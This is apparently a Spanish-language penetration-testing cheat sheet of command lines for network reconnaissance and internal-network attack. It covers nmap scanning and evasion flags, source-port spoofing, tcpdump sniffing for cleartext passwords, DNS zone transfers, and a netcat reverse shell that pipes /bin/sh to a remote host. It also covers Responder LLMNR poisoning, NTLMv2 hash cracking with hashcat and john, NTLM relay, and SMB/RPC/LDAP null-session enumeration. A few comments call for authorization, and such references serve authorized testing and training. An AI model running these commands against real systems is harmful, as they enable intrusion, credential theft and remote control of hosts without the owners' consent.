# Recon de Red y Servicios — Herramientas

## nmap a fondo

```bash
# SINTAXIS BASE: sudo nmap -<tipo-scan> [flags] -p <puertos> -oA <out> <target>
# Tipos: -sS SYN (stealth, root) | -sT connect (sin root, logs en target) | -sU UDP
#        -sV versiones | -sC scripts default | -sA ack (firewall) | -sN/-sF/-sX (firewall evasion)

# PROGRESION RECOMENDADA (rapido → completo, nunca empezar por -p- sin plan):
sudo nmap -sn 10.10.10.0/24 -oG $BASE/scans/hostup.txt          # 1. who is alive (ARP/ping)
sudo nmap -sS -T3 --top-ports 1000 10.10.10.0/24 -oA scans      # 2. superficie
sudo nmap -sS -sV -sC -p- --min-rate 300 --open target -oA full # 3. completo (tmux!)
sudo nmap -sU -sV --top-ports 100 -p 53,67,68,123,137,161,162,500,514,1701 target -oA udp

# SCRIPTS: --script=<categ> o <nombre>
# Categorias utiles: auth, broadcast, default, discovery, dos, exploit, external,
#                    fuzzy, safe, version, vuln
nmap -sC --script "discovery and safe" target                  # enum agresiva-pero-segura
nmap --script=vuln target                                       # SOLO en labs/autorizado-explicito (ruidoso+DoS)
nmap --script=http-sitemap-generator,http-backup-finder target
nmap --script=dns-zone-transfer -p 53 ns1.target.tld            # AXFR: `dig axfr` primero
nmap --script=snmp-* -p 161 target                             # SNMP enum (public community?)
nmap -p445 --smb-protocols --script smb-protocols,smb-os-discovery target

# OUTPUT: -oN texto | -oX xml | -oG grepable | -oA todos → SIEMPRE -oA a scans/
# EVASION: -f fragmenta | -D decoy1,target,decoy2 | --data-length 50 | -T2 lento | --ttl 1
```

## nping — crafting y testeos finos

```bash
nping --tcp -p 443 --flags syn target           # SYN manual: firewall filtra o responde?
nping --icmp -c 20 --rate 100 target            # testeos de tactica ICMP
nping --tcp-connect -p 1-10000 target           # scan connect como nmap pero verbose
nping --source-port 53 target                   # spoof de puerto origen (ACLs legacy "trust")
```

## tcpdump — el ojo en el alambre (verificar que el trafico REAL sale/llega)

```bash
sudo tcpdump -i eth0 -nn -s0 host 10.10.10.10 and port 445 -w $BASE/evidence/smb.pcap
sudo tcpdump -i tun0 -nn 'tcp[tcpflags] & (tcp-syn) != 0'   # ¿mis SYN salen por el tunel?
tcpdump -r loot.pcap -A | grep -i "password\|token\|auth"    # cleartext hunt
```

## DNS — enumeracion y ataque

```bash
dig target.tld ANY +noall +answer
dig axfr @ns1.target.tld target.tld              # ZONE TRANSFER: hallazgo critico si responde
dig +trace target.tld                            # delegation path completo
delv target.tld +dnssec                          # validacion DNSSEC
mdig -c100 -c $BASE/scans/subs.txt +short       # resolver multi-hilo para miles de nombres
nslookup -type=SRV _ldap._tcp.corp.local        # DC discovery (Kerberos/AD recon pasivo)
nsupdate                                      # Dynamic DNS update: probar si acepta sin auth
showmount -e 10.10.10.20                        # NFS exports
rpcinfo -p 10.10.10.20                          # RPC portmap
```

## netcat / ncat — el oido y la boca

```bash
nc -lvnp 4444                                    # listener reverse shell
nc target 80 < payload.txt                        # banner/manual HTTP
nc target 4444 -e /bin/sh                        # reverse con -e (nc.traditional)
ncat -lvnp 4444 --ssl                             # listener cifrado (ncat de nmap soporta TLS)
socat TCP-LISTEN:80,fork,reuseaddr TCP:10.10.10.5:80  # port-forward manual
```

## responder — LLMNR/NBT-NS/MDNS poisoning (red interna)

```bash
sudo responder -I eth0 -wrf                       # HTTP/SMB capture + poison; -w logs, -r names
# Confirmar ANTES con usuario: responder es ruidoso y puede afectar navegacion de la VLAN.
# Tras capturar hashes NTLMv1/v2:
hashcat -m 5600 capture.txt rockyou.txt           # NTLMv2
john --format=netntlmv2 capture.txt
# Relay inmediato: responder.conf SMB=off + impacket-ntlmrelayx -t smb://target
```

## Otros servicios heredados/utiles

```bash
snmp-check 10.10.10.20 -c public 2>/dev/null    # enum SNMP v1/v2 (si no esta: onesixty-one o nmap snmp-*)
enum4linux-ng -A 10.10.10.20                    # enum SMB completa (usuarios, shares, politicas)
smbclient -L //10.10.10.20 -U ''%''                             # null session
rpcclient -U "" -N 10.10.10.20                                  # null session RPC
ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=local" "(objectClass=*)" -LLL | head  # anon LDAP
```
